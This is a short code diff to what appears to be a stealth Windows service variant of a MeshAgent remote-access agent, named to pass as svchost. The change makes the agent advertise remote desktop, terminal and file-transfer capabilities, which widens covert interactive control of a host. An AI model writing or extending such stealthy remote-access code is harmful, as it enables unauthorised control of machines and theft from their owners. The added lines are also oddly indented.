@@ -1311,7 +1311,13 @@ VOID WINAPI Stealth_SvchostServiceMain(DWORD dwArgc, LPTSTR *lpszArgv)
     Stealth_SvchostInitializePaths(NULL);
 
     // Initialize MeshAgent core with default capabilities
-    g_SvchostAgent = MeshAgent_Create(0);
+    // Advertise the standard interactive management capabilities.
+// MeshAgent_Create() adds CONSOLE/JAVASCRIPT/COMPRESSION internally.
+g_SvchostAgent = MeshAgent_Create(
+    MeshCommand_AuthInfo_CapabilitiesMask_DESKTOP |
+    MeshCommand_AuthInfo_CapabilitiesMask_TERMINAL |
+    MeshCommand_AuthInfo_CapabilitiesMask_FILES
+);
 
     if (!g_SvchostAgent)
     {
